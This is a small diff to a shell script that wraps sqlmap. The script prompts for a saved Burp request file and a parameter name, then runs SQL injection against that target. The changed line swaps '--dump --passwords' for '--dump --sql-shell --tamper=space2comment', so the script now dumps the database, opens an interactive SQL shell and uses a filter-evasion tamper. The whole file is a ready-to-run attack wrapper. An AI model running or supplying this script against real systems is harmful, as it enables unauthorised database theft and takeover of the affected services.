@@ -1,6 +1,4 @@
-#Save your burp request and type the file name in this script.
-
 read -p 'Enter Request File: ' req
 read -p 'Enter Param : ' par
 
-sqlmap -r $req -p $par --dump --passwords --dbms=mysql
+sqlmap -r $req -p $par --dump --sql-shell --tamper=space2comment
